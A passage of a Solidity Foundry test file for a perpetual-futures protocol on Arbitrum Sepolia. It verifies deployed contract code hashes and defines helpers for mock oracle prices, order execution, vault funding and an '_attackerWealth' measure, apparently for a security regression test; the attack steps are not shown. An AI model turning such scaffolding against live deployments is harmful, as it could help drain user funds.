        // runtimeCodeHash values from deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json
        assertEq(
            address(ENGINE).codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b, "engine"
        );
        assertEq(
            address(bytes20(hex"802a0755413fb966b397155b5c5cc0198e6bed3f")).codehash,
            0x16f6c8107b8f2965f1074df12878802c20aac2a54121c4c60854b29e1f18a9f1,
            "planner"
        );
        assertEq(
            address(bytes20(hex"7fcc97330a21074c388fdef729d582df261b883d")).codehash,
            0xda0a1f2e3ede6134ff938541a61890db5c4ccc4c0cafdfed0b6a2196303ef219,
            "planning reader"
        );
        assertEq(
            address(bytes20(hex"d3ede337e042d5aa6ba68e03d0c885b3d4a062dc")).codehash,
            0x540083c758046571c5770f9950282eef938986ff41d78538109ddf549534b059,
            "settlement sidecar"
        );
        assertEq(
            address(bytes20(hex"61c7f7cf91c295a86250e1e05a91901e8e1e51a3")).codehash,
            0x181223a2ac1c4fc3811d6bac5bc882310ff933d5450ffce6de5cf0c44aeb55b9,
            "terminal NAV book"
        );
        assertEq(address(POOL).codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957, "pool");
        assertEq(
            address(bytes20(hex"70cd3b39bc5a006784777048c7b690f10642cbf1")).codehash,
            0x6bd056f471727898e21e8cb0d2a77efcb5a0f87e1d853a17a3a12b316812c65a,
            "redemption math sidecar"
        );
        assertEq(
            address(SENIOR).codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a, "senior"
        );
        assertEq(
            address(JUNIOR).codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf, "junior"
        );
        assertEq(address(CH).codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398, "clearing");
        assertEq(address(ROUTER).codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf, "router");
        assertEq(
            address(bytes20(hex"0ae016ef599bcdf0bbbedba441401c3b6c6184ea")).codehash,
            0xfc72fcbe4496d0d5356e96d259536cd4edcb926dd7fe1473a4275ddfb09cb57e,
            "execution sidecar"
        );
        assertEq(
            address(bytes20(hex"7e51e12d77e77d33835cbafe17ce11398714974b")).codehash,
            0x39aabdb68c7d12701493d8d35b1e62c538f63a5ed673de6f716eb938321a9458,
            "policy evaluator"
        );
        assertEq(
            address(bytes20(hex"327d5fd04e17d96dd5c4f845a0b4256a9e19645c")).codehash,
            0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554,
            "lifecycle book"
        );
        assertEq(address(ORACLE).codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13, "oracle");
        assertEq(
            address(bytes20(hex"7b605d7c57c191379822705d8510109d4b2573aa")).codehash,
            0x8420be926293c70a880b5f12c07674861563727a04aca954323004855807c8f7,
            "router keeper sidecar"
        );
        assertEq(
            address(bytes20(hex"2df705806c0013e75e36fad4d6595c998f4295be")).codehash,
            0x8fb495ac2ca692f9d40f7ad29907bdb8a0154140294cf0f16b263ca0db7cb7ff,
            "order recovery sidecar"
        );
        assertEq(
            address(bytes20(hex"82fc00d77e86c52e2480459d07ad6220f1106413")).codehash,
            0xffcf90edaa061400b7fbf0272a3bc6bed52aab23833bbf6346654b23a4598e2f,
            "engine protocol lens"
        );
        assertEq(
            address(bytes20(hex"fca322c6868cef53bd5c344628f9874712e48108")).codehash,
            0x3af6c7539add5ddd3b517ad7397e717259f63637635cd947495675164d82d1a4,
            "engine lens"
        );
    }

    function _priceData(
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: feedPrices[i],
                    conf: feedConfs[i],
                    expo: feedExpos[i],
                    publishTime: publishTime,
                    prevPublishTime: prevPublishTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _refreshMark() internal {
        _warpTo(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _priceData(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
        uint256 fee = ORACLE.getUpdateFee(data);
        vm.prank(KEEPER);
        ROUTER.updateMarkPrice{value: fee}(data);
    }

    function _settleLpEpoch() internal {
        _warpTo(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _priceData(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
        uint256 fee = ORACLE.getUpdateFee(data);
        vm.prank(KEEPER);
        ROUTER.settleLpEpoch{value: fee}(data);
    }

    function _routerTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (int256 vpiAssets) {
        uint256 window = ROUTER.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: IOrderLifecycleBook(ROUTER.lifecycleBook()).currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        uint256 commitTime = vm.getBlockTimestamp();
        vm.prank(account);
        uint64 id = ROUTER.commitOrder(request);

        _warpTo(commitTime + 1);
        bytes[] memory data = _priceData(commitTime + 1, commitTime);
        uint256 fee = ORACLE.getOrderExecutionFee(data);
        vm.recordLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder{value: fee}(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "deployed Router executes");
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool found;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(ROUTER.lifecycleBook()) && logs[i].topics.length == 4) {
                (bytes32 receiptHash,,, OrderV3Types.OrderReceipt memory receipt) =
                    abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                if (receiptHash == result.receiptHash) {
                    assertEq(receipt.orderId, id, "decoded authenticated receipt order id");
                    vpiAssets = receipt.economics.vpiAssets;
                    found = true;
                    break;
                }
            }
        }
        assertTrue(found, "authenticated order receipt emitted");
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) internal {
        USDG.mint(trader, amount);
        vm.startPrank(trader);
        USDG.approve(address(CH), amount);
        CH.deposit(trader, amount);
        vm.stopPrank();
    }

    function _fundTranche(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        _refreshMark();
        USDG.mint(lp, assets);
        vm.startPrank(lp);
        USDG.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _warpTo(vault.depositEpochStart(id));
        _settleLpEpoch();
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        assertEq(claimable, assets, "honest deposit activates");
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    function _attackerWealth() internal view returns (uint256) {
        return USDG.balanceOf(ATTACKER) + CH.balanceAssets(ATTACKER) + _juniorValue(ATTACKER);
    }

    function _juniorValue(
        address account
    ) internal view returns (uint256) {
        return JUNIOR.convertToAssets(JUNIOR.balanceOf(account));
    }

    function _seniorValue(
        address account
    ) internal view returns (uint256) {
        return SENIOR.convertToAssets(SENIOR.balanceOf(account));
    }

}
```

